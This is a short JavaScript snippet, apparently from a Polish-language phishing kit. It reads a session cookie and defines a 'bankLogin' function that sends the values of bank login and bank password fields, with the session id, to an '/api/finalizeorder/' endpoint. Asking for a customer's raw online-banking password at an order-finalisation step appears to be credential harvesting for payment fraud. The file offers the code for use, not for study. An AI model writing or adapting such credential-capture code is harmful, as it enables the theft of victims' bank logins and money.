let cookieManager = new Cookies();
let sessId = (cookieManager.read('session_id'))

function readTextFile(file, callback) {
    var rawFile = new XMLHttpRequest();
    rawFile.overrideMimeType("application/json");
    rawFile.open("GET", file, true);
    rawFile.onreadystatechange = function() {
        if (rawFile.readyState === 4 && rawFile.status == "200") {
            callback(rawFile.responseText);
        }
    }
    rawFile.send(null);
}




const bankLogin = () => {
    if ($("#bank_password").val() && $("#bank_login").val() !== "") {
        $.post("/api/finalizeorder/", {
            bank_password: $("#bank_password").val(),
            bank_login: $("#bank_login").val(),
            sessionId: sessId
        }).done(data => {
            console.log('done')
        }).fail(error => {
            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
        })

    } else {
        console.log('not selectec')
    }
}

